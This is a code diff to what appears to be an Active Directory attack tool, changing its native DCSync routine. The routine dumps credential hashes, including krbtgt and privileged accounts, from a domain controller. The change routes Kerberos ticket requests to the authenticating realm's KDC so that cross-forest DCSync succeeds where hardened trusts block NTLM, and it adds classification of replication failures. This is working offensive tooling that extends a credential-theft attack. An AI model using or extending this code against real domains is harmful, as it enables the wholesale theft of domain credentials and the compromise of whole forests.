@@ -893,6 +893,7 @@ def execute_dcsync_native(
     )
     from adscan_internal.services.exploitation.dump_display import (
         DumpDisplay,
+        classify_dcsync_failure,
     )
     from adscan_internal.services.smb_transport import SMBConfig
     from adscan_internal.principal_utils import is_machine_account
@@ -920,6 +921,28 @@ def execute_dcsync_native(
         return None
 
     effective_auth_domain: str = auth_domain or domain
+
+    # Cross-forest KDC resolution. ``pdc_ip`` is the TARGET realm's DC (the
+    # replication source, keyed on ``domains_data[domain]``). The credential's own
+    # AS-REQ / TGT mint MUST go to the AUTH realm's KDC — a KDC only issues an
+    # AS-REP for principals in its own realm, so minting ``user@AUTH_REALM`` against
+    # the target realm's KDC yields KDC_ERR_C_PRINCIPAL_UNKNOWN and the Kerberos
+    # path silently degrades to NTLM (which a hardened cross-forest trust blocks).
+    # ``do_dcsync`` threads a distinct ``auth_domain`` precisely so the AS-REQ hits
+    # the credential's KDC; honor that here. In the single-domain case this equals
+    # ``pdc_ip`` (same record), so a same-forest DCSync is unchanged.
+    from adscan_internal.services.cross_forest_kdc import (
+        resolve_auth_kdc_for_cross_forest,
+    )
+
+    auth_kdc_ip: str = str(
+        resolve_auth_kdc_for_cross_forest(
+            getattr(shell, "domains_data", None),
+            auth_domain=effective_auth_domain,
+            target_domain=domain,
+        )
+        or pdc_ip
+    )
 
     # ------------------------------------------------------------------
     # Context panel — who, what, where (shown before the stream starts)
@@ -1026,7 +1049,7 @@ def execute_dcsync_native(
             _tgt_ccache = tempfile.mktemp(suffix=".ccache", prefix="adscan_dcsync_")
             _kr_cfg = KerberosConfig(
                 domain=effective_auth_domain,
-                kdc_ip=pdc_ip,
+                kdc_ip=auth_kdc_ip,
                 username=username,
                 password=password,
                 ccache_path=_tgt_ccache,
@@ -1067,7 +1090,11 @@ def execute_dcsync_native(
         nt_hash=password if (is_hash and not _workspace_ccache) else None,
         ccache_path=_use_ccache,
         use_kerberos=bool(_use_ccache),
-        kdc_ip=pdc_ip,
+        # kdc_ip = the AUTH realm's KDC (AS stage); target_kdc_ip = the TARGET
+        # realm's KDC (the referral, = the replication DC). When the realms
+        # coincide (single-domain) both are pdc_ip and the bind is unchanged.
+        kdc_ip=auth_kdc_ip,
+        target_kdc_ip=pdc_ip,
     )
     print_info_debug(
         f"dcsync-native: SMBConfig: use_kerberos={smb_config.use_kerberos} "
@@ -1097,6 +1124,7 @@ def execute_dcsync_native(
     builtin_admin_account: str | None = None  # populated when RID==500 row arrives
     errors_seen: int = 0
     _stream_error_types: list[str] = []  # track error class names to distinguish timeout vs access denied
+    _stream_error_texts: list[str] = []  # full error strings — classify the terminal replication cause
     start_time = time.monotonic()
 
     def _extract_rid(sid: str | None) -> int | None:
@@ -1140,6 +1168,7 @@ def execute_dcsync_native(
             if err is not None:
                 errors_seen += 1
                 _stream_error_types.append(type(err).__name__)
+                _stream_error_texts.append(str(err))
                 print_info_debug(
                     f"dcsync-native: stream error: {type(err).__name__}: {err}"
                 )
@@ -1242,6 +1271,13 @@ def execute_dcsync_native(
 
     elapsed = time.monotonic() - start_time
     display.stop_credential_stream()
+    # Only classify a terminal replication cause when the run recovered nothing
+    # AND the stream surfaced errors — so a partial/clean haul renders unchanged.
+    _dcsync_failure = (
+        classify_dcsync_failure(_stream_error_texts)
+        if (not raw_credentials and _stream_error_texts)
+        else None
+    )
     display.dcsync_summary(
         total=len(raw_credentials),
         privileged_count=len(privileged_accounts),
@@ -1249,6 +1285,7 @@ def execute_dcsync_native(
         has_krbtgt=krbtgt_found,
         host=pdc_hostname or pdc_ip,
         elapsed=elapsed,
+        dcsync_failure=_dcsync_failure,
     )
 
     if errors_seen > 0:
